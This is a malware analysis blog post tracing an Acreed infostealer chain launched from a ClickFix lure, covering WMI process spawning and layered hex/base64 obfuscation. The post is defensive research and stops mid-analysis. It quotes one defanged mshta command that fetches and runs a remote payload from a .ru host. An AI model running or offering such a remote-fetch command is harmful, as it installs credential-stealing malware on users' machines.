---
layout: post
title:  "Acreed InfoStealer - Malware Analysis"
date:   2025-09-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Here we will be analysisng an Acreed Infostealer execution chain from a Clickfix payload.

I thought LummaStealer was difficult. This one is ridicolous.

### What does Mshta pull? 

``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4``

Okay, when safely pulled with my jank script we get about 2.5mbs of bits and bytes. 

![alt text](/images/mal_first.PNG)
- First can a command to move open mshta cmd window to (-99,0) on the screen, which is the bottom left. Likely to avoid suspicion?
- Next we can see an ``ELF`` file header and a Linux OS? Perhaps this is an embedded linux file. I can try to rebuild it cause we have the bytes!
- Last we have a script open up with some obfuscated VB code? What a throwback.

What's really interesting is the file opens ``script`` encapsulates the .elf file in it then closes ``script``. Really cool.

I tried to rebuild the .elf file in a Linux VM but cannot get it right, probably a character or a space off the right bits and bytes. I'll leave it. I reckon further down the line the code will call it and give the opportunity for us to dump it successfully.

![alt text](/images/vbs.PNG)

Looks like we have some hex strings here, I'm seeing this throughout the code, so I'll go through and convert every hex string I spot.

![alt text](/images/unobfuscted_first.PNG)

Now we can see a bit better, here what this function does.
1. Parses in the variable ``thkiaqvpzab``
2. Declares variables
3. Creates a WMI object
4. Connects to WMI service on machine
5. Gets the ProcessStartup class. This allows for process creation and management using WMI.
6. Sets the configuration of the WMI service to the variable ``nrhfhprneb`` with three flags. Configuration of WMI Object (``aihoizxpjk``), window size (``aihoizxpjk``) and an unknown variable of that passed in variable ``thkiaqvpzab``

Essentially the function uses WMI to spawn a hidden process. And, we are after what is passed to the function ``nrhfhprneb`` because that is likely a command/script.

![alt text](/images/second_part.PNG)

Now this pieces together the puzzle, this function creates the new process with the startup settings passed in from our previous function. 

![alt text](/images/next.PNG)

This stinks of our payload. Looks like Hex --> B64 --> Plaintext?

![alt text](/images/cyberchef_first.PNG)

Bingo. But that last part still looks like B64.

![alt text](/images/cyberchef_second.PNG)

Okay, so we have cleartext. Obfuscated of course. But we know how it's being encoded. We have 60 lines of this same pattern. We probably 70-80 different instances of the above I just ran through. So rather than manually do this, I might try to pass this into LordGPT to decode this for me!

So, LordGPT does not decoding payloads, fair enough.

All the hex strings start by calling the function ``eanjxdqwjegyor``, which is our decoder. So I should be able mimick this behaviour in my own script. Copy paste the decoder and the encoded strings. Badda bing badda boom.

![alt text](/images/decoded.PNG)

We have a powershell call and about 400 characters of more B64.

![alt text](/images/decoded_b64.PNG)

When I decode that B64 we can see a bit better, but still not great. All the data lives in the variable ``JzkRs``. 

I have no idea what those bits and bytes are. 

Zooming out I can see the value of all these encoded bits and bytes are passed to the variable ``rbeqwxctrp`` which is called later on in the script. So I will park this here for now. I reckon we will be able to dump it easier later.

![alt text](/images/error.PNG)

Looks some type of error handling script. I will say this now, this obfuscation is unique. However, the naming convention of the functions is identical to the last LummaStealer sample I manually analysed, so my money is on Lumma!

![alt text](/images/next_variable.PNG)

The function ``ozybymuzpian`` calls the function ``rbeqwxctrp`` which was used to store all the bits and bytes from the encoded hex --> b64 strings we observed above.

Then sets a value for the variable ``nfaupnpmtf`` to the output of the function ``pfikjr`` with a passed in parameter of ``poahoksthybhusnasu``. We have yet to have a look at the function ``pfikjr`` but will soon. This is getting good.

Now this is interesting. AutoOpen() is a macro used for Word/Excel. So perhaps, the malware opens an embedded word/excel document with a macro in it? AutoOpen() calls in ``ozybymuzpian``

![alt text](/images/third_function.PNG)

I'm not sure about this function. Really got no idea. May circle back.

![alt text](/images/fourth_function.PNG)

